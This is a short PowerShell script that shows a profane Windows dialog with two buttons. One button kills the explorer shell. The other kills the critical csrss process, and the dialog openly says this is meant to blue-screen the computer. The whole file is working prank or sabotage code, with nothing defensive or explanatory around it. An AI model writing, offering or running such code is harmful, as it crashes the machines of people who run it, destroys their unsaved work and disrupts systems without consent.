Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Well, You Fucked Up!"
$form.Size = New-Object System.Drawing.Size(300,150)
$form.StartPosition = "CenterScreen"

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(70,20)
$label.Size = New-Object System.Drawing.Size(160,20)
$label.Text = "Click the button to Blue Screen your screen!"
$form.Controls.Add($label)

$button_fuck = New-Object System.Windows.Forms.Button
$button_fuck.Location = New-Object System.Drawing.Point(30,60)
$button_fuck.Size = New-Object System.Drawing.Size(100,30)
$button_fuck.Text = "Fuck"
$button_fuck.Add_Click({
    Stop-Process -ProcessName explorer
})
$form.Controls.Add($button_fuck)

$button_fuck_off = New-Object System.Windows.Forms.Button
$button_fuck_off.Location = New-Object System.Drawing.Point(160,60)
$button_fuck_off.Size = New-Object System.Drawing.Size(100,30)
$button_fuck_off.Text = "Fuck off"
$button_fuck_off.Add_Click({
    Stop-Process -ProcessName csrss
})
$form.Controls.Add($button_fuck_off)

[void] $form.ShowDialog()
